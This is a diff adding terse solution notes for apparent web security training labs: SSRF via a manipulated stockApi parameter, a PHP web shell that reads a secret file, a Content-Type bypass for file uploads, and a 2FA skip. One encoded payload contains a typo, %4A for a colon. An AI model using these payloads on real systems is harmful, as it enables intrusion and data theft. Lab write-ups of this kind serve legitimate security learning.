@@ -34,3 +34,21 @@ Intrude. (wihout Pro filter is really shxxxxt.)
 
 ## Lab: 2FA simple bypass
 Login with password, just skip the 2FA page (change URL).
+
+
+## Lab: Basic SSRF against the local server
+
+Intercept Stock check request and change the stockApi to `http%4A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos`
+
+## Lab: Basic SSRF against another back-end system
+1. First iterate stockAPI to find the admin url
+2. check `Lab: Basic SSRF against the local server`
+
+## Lab: Remote code execution via web shell upload
+1. Upload a php file contains:  
+    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+2. Visit `https://host/files/avatars/filename.php`.
+
+
+## Web shell upload via Content-Type restriction bypass
+Basically same as `Lab: Remote code execution via web shell upload` just change the php file's Content-Type to image/jpeg.
